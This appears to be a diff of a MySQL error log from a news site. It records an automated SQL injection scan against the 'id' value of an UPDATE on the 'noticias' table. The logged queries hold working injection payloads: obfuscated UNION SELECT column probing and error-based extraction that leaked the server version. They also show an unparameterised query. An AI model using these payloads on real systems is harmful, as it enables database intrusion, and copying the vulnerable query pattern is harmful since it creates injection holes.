0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39
+
+Time : 15:39:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39
+
+Time : 15:39:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39
+
+Time : 15:39:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39
+
+Time : 15:39:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39
+
+Time : 15:39:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39
+
+Time : 15:39:56
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39
+
+Time : 15:39:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39
+
+Time : 15:39:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39
+
+Time : 15:39:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39
+
+Time : 15:39:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39
+
+Time : 15:39:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39
+
+Time : 15:39:55
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39
+
+Time : 15:39:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39
+
+Time : 15:39:54
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39
+
+Time : 15:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39
+
+Time : 15:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39
+
+Time : 15:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39
+
+Time : 15:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39
+
+Time : 15:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39
+
+Time : 15:39:53
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39
+
+Time : 15:39:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39
+
+Time : 15:39:52
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39
+
+Time : 15:39:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39
+
+Time : 15:39:51
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39
+
+Time : 15:39:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39
+
+Time : 15:39:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39
+
+Time : 15:39:50
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39
+
+Time : 15:39:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39
+
+Time : 15:39:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39
+
+Time : 15:39:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39
+
+Time : 15:39:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39
+
+Time : 15:39:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39,0x393133353134353632322e39
+
+Time : 15:39:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=999999.9 /**/uNiOn/**/aLl /**/sElEcT 0x393133353134353632312e39
+
+Time : 15:39:48
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 15:39:48
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!5.6.25-log!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/cOnCaT(0x217e21,/**/vErSiOn(),0x217e21)) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 15:39:46
+SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '!~!ABC145ZQ62DWQAFPOIYCFD!~!1' for key 'group_key'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=(/**/sElEcT 1 /**/fRoM(/**/sElEcT count(*),/**/cOnCaT((/**/sElEcT(/**/sElEcT /**/uNhEx(/**/hEx(/**/cOnCaT(0x217e21,0x4142433134355a5136324457514146504f4959434644,0x217e21)))) /**/fRoM information_schema./**/tAbLeS /**/lImIt 0,1),floor(rand(0)*2))x /**/fRoM information_schema./**/tAbLeS /**/gRoUp/**/bY x)a)
+
+Time : 15:39:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''0=A' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id='0=A
+
+Time : 15:38:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''A=0' at line 1
